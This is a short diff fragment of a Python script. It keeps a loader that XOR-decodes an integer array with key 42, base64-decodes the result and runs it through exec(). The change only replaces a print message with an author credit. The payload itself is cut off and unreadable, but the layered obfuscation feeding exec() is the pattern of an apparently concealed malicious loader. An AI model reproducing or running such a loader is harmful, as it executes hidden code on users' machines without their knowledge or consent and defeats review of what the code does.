@@ -7,4 +7,4 @@ obfuscated_script = [112, 68, 96, 92, 72, 121, 104, 80, 79, 114, 103, 77, 75, 12
 
 base64_script = xor_decrypt(bytearray(obfuscated_script), 42)
 exec(base64.b64decode(base64_script).decode('utf-8'))
-    print(f"Obfuscated Python script saved to 'C:\Users\User\Desktop\FULL\encoded\ver.py'. It will execute the original code.")
+print(f"Script Made By Lucas.")
